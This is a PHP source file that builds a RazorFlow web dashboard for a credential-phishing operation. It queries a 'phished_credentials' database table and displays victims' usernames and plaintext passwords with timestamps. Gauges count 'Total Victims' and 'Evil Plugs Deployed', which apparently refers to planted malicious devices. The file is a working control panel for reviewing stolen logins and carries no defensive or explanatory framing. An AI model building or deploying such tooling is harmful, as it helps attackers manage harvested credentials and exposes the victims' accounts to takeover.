<?php
// Require the RazorFlow php wrapper
require('razorflow_php/razorflow.php');
// You can rename the "MyDashboard" class to anything you want
class MyDashboard extends StandaloneDashboard {



    public function buildDashboard () {

        $servername = "CONFIGURE_DB_IP";
        $username = "CONFIGURE_DB_USER";
        $password = "CONFIGURE_DB_PASS";
        $dbname = "CONFIGURE_DB_NAME";

        // Build your dashboard here.
                $table = new TableComponent ('PhishedCredentials');
                $table->setCaption ("Phished Credentials");
                $table->setDimensions (8, 6);
        $table->setRowsPerPage (8);
                $table->addColumn ('username', "Username");
                $table->addColumn ('password', "Password");
                $table->addColumn ('date', "When");

// Create connection
                $conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
                if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
        }

        $sql = "SELECT username, password, timestamp FROM phished_credentials;";
        $result = $conn->query($sql);
        $total_victims = $result->num_rows;
        if ($result->num_rows > 0) {
    // output data of each row

    while($row = $result->fetch_assoc()) {

                $table->addRow (array("username" => $row["username"], "password" => $row["password"], "date" => $row["timestamp"]));
    }
        } else {
    //echo "0 results";
        }
        $conn->close();
        $this->addComponent($table);



        $gauge = new GaugeComponent ('Victims');
        $gauge->setDimensions (3, 2);
        $gauge->setLimits(0, 50);
        $gauge->setValue($total_victims, array("numberPrefix" => ""     ));
        $gauge->setCaption("Total Victims");
        $this->addComponent($gauge);

        $gauge1 = new GaugeComponent ('Plugs');
        $gauge1->setDimensions (3, 2);
        $gauge1->setLimits(0, 15);
        $gauge1->setValue(1, array("numberPrefix" => "" ));
        $gauge1->setCaption("Evil Plugs Deployed");
        $this->addComponent($gauge1);


    }
}

echo "<img src='logo.png' style='display: block;  margin: 0 auto;'/>";

$dashboard = new MyDashboard ();
$dashboard->renderStandalone ();
?>
